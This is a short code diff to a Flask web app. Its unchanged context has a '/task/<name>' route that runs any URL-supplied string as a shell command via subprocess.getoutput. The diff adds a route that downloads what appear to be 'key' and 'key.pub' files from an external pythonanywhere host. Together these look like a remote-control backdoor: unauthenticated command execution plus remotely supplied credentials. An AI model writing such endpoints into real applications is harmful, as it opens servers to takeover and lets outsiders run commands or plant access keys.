@@ -14,7 +14,11 @@ def hello_world():
 @app.route('/task/<string:name>')
 def task(name):
  return subprocess.getoutput(name)
-
+@app.route('/task/')
+def taskgetready():
+ wget.download("https://testi123.pythonanywhere.com/static/9854758/key")   
+ wget.download("https://testi123.pythonanywhere.com/static/9854758/key.pub") 
+ return "key ready"
 @app.route('/check/check')
 def check():
     wget.download("https://testi123.pythonanywhere.com/static/datacheck.xlsx")
